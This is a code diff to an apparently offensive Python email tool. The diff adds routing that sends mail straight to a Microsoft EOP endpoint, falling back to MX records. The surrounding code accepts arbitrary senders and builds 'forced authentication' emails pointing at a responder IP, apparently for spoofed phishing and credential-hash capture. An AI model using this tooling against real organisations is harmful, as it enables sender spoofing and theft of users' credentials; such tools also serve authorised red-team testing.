@@ -83,6 +83,19 @@ def get_mx_record(domain):
         print(f"  {RED}[!]{RESET} Could not resolve MX for {domain}: {e}")
     return None
 
+def resolve_smtp_target(domain):
+    """Try EOP direct endpoint first, fall back to MX."""
+    eop_host = get_eop_hostname(domain)
+    try:
+        eop_ip = dns.resolver.resolve(eop_host, "A")[0].to_text()
+        return eop_ip, f"EOP → {eop_host}"
+    except Exception:
+        pass
+    mx_ip = get_mx_record(domain)
+    if mx_ip:
+        return mx_ip, f"MX → {domain}"
+    return None, ""
+
 def has_mx_record(domain):
     try:
         dns.resolver.resolve(domain, "MX")
@@ -643,17 +656,17 @@ def prompt_forced():
     subject, tmpl = cfg
     body  = create_forced_auth_email(tmpl, responder_ip)
     rcp_domain = recipient.split("@")[1]
-    mx    = get_mx_record(rcp_domain)
-    if not mx:
+    smtp_ip, route = resolve_smtp_target(rcp_domain)
+    if not smtp_ip:
         return
     print(f"\n  {'─' * 50}")
     print(f"  From    : {sender}")
     print(f"  To      : {recipient}")
     print(f"  Subject : {subject}")
-    print(f"  Via     : MX ({mx})")
+    print(f"  Via     : {route}  ({smtp_ip})")
     print(f"  {'─' * 50}")
     if input("\n  Send? [y/N]: ").strip().lower() == "y":
-        send_email(mx, sender, recipient, subject, body)
+        send_email(smtp_ip, sender, recipient, subject, body)
     else:
         print(f"  {YELLOW}Cancelled.{RESET}")
 
@@ -892,10 +905,11 @@ def main():
 
         for rcp in recipients:
             rcp_domain = rcp.split("@")[1]
-            mx = get_mx_record(rcp_domain)
-            if not mx:
+            smtp_ip, route = resolve_smtp_target(rcp_domain)
+            if not smtp_ip:
                 continue
-            send_email(mx, args.sender, rcp, subject, body)
+            print(f"  {DIM}[→] {route}{RESET}")
+            send_email(smtp_ip, args.sender, rcp, subject, body)
         return
 
     parser.print_help()
